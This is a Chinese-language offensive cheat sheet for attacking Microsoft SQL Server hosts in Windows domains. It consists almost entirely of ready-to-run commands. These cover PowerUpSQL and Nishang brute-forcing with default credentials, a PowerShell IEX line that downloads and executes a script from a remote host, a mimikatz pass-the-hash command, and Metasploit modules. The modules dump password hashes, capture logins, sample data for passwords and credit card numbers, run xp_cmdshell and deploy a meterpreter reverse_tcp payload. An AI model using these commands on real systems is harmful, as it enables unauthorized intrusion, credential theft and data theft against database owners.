  ### Powershell脚本	
	>PowerShell -Command "[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()" 列出域内mssql主机
	https://github.com/NetSPI/PowerUpSQL
	>Get-SQLInstanceLocal          #发现本机SQLServer实例
	>Get-SQLInstanceDomain         #发现域中的SQLServer实例
	>Get-SQLInstanceBroadcast      #发现工作组SQLServer实例
	>$Targets = Get-SQLInstanceBroadcast -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username sa -password admin | Where-Object {$_.Status -like "Accessible"} 工作组mssql爆破
	>$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username sa -password admin | Where-Object {$_.Status -like "Accessible"} 
	>Get-SQLInstanceBroadcast -Verbose | Get-SQLServerLoginDefaultPw –Verbose
	>$Targets 域内MSSQL爆破
	Nishang脚本爆破MSSQL
	>Invoke-BruteForce -ComputerName dc.zone.com -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose -StopOnSuccess
	>use auxiliary/scanner/mssql/mssql_login 爆破主机
	>use auxiliary/admin/mssql/mssql_exec 调用cmd
	>use auxiliary/admin/mssql/mssql_sql 执行SQL语句
	>use exploit/windows/mssql/mssql_payload 上线MSSQL主机
	http://192.168.0.107/ps/nishang/Execution/Execute-Command-MSSQL.ps1
	导入nishang执行MSSQL命令的脚本
	>IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Execution/Execute-Command-MSSQL.ps1')
	>Execute-Command-MSSQL -ComputerName 192.168.0.98 -UserName sa -Password admin 会返回powershell
	>use auxiliary/scanner/mssql/mssql_hashdump 导出MSSQL密码
	已知服务器ntlmhash，未知mssql账号密码
	Hash注入+socks无密码连接mssql
	>mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:. /ntlm:{hash} /run:\"C:\*\SocksCap64\SocksCap64_RunAsAdmin.exe\"" "exit"
	将SSMS.exe加入sockscap中启动
	命令行版sqltool
	https://github.com/uknowsec/SharpSQLTools
  ### MSF攻击mssql
  	定位mssql服务器
	>use auxiliary/scanner/mssql/mssql_ping
	>set rhosts 192.168.1.1/24
	>exploit
	密码破解
	>use auxiliary/scanner/mssql/mssql_login
	>set rhosts 192.168.1.3
	>set user_file /root/users.txt
	>set verbose false
	>exploit
	检索版本
	>use auxiliary/admin/mssql/mssql_sql
	>set rhosts 192.168.1.3
	>set username lowprwiv
	>set password Password@1
	>exploit
	枚举信息
	>use auxiliary/admin/mssql/mssql_enum
	>set rhosts 192.168.1.3
	>set username lowpriv
	>set password Password@1
	>exploit
	用户枚举
	>use auxiliary/admin/mssql/mssql_enum_sql_login
	>set rhosts 192.168.1.3
	>set username lowpriv
	>set password Password@1
	>exploit
	捕获登录信息
	>use auxiliary/server/capture/mssql
	>set srvhost 192.168.1.2
	>exploit
	DUMP数据
	>use auxiliary/admin/mssql/mssql_findandsampledata
	>set rhosts 192.168.1.3
	>set username lowpriv
	>set password Password@1
	>set sample_size 4
	>set keywords FirstName|passw|credit
	>exploit
	DUMP哈希
	>use auxiliary/scanner/mssql/mssql_hashdump
	>set rhosts 192.168.1.149
	>set username sa
	>set password Password@1
	>expoit
	执行命令xp_cmdshell
	>use exploit/windows/mssql/mssql_payload
	>set rhosts 192.168.1.3
	>set username lowpriv
	>set password Password@1
	>exploit
	MSSQl_exec
	>use auxiliary/admin/mssql/mssql_exec
	>set rhosts 192.168.1.3
	>set username lowpriv
	>set password Password@1
	>set cmd "net user"
	>exploit
	CLR程序集
	>use exploit/windows/mssql/mssql_clr_payload
	>set payload windows/x64/meterpreter/reverse_tcp
	>set username lowpriv
	>set password Password@1
	>exploit
	权限提升
	>use auxiliary/admin/mssql/mssql_escalate_dbowner
	>set rhosts 192.168.1.3
	>set username lowpriv
	>set password Password@1
	>exploit
	冒用
	>use auxiliary/admin/mssql/mssql_escalate_execute_as
	>set rhosts 192.168.1.3
	>set username lowpriv
	>set password Password@1
	>exploit